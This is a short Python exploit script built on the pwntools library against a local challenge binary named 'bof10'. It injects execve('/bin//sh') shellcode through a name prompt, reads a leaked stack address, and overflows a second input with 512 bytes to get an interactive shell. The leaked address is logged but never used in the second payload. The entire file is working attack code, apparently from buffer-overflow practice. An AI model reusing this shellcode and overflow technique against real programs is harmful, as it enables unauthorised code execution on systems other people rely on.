#!/usr/bin/python3
from pwn import *

context.binary = exe =ELF('./bof10')
p = process(exe.path)

input()
#1
shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
payload = shellcode + b'b'*(79 - len(shellcode))
p.sendlineafter(b'name: ', payload)

#leak
p.recvuntil(b'you: ')
leak_stack = int(p.recvline(), 16)
log.info('leak_stack: ' + hex(leak_stack))

payload = b'a'*512
p.sendlineafter(b'something: ', payload)

p.interactive()
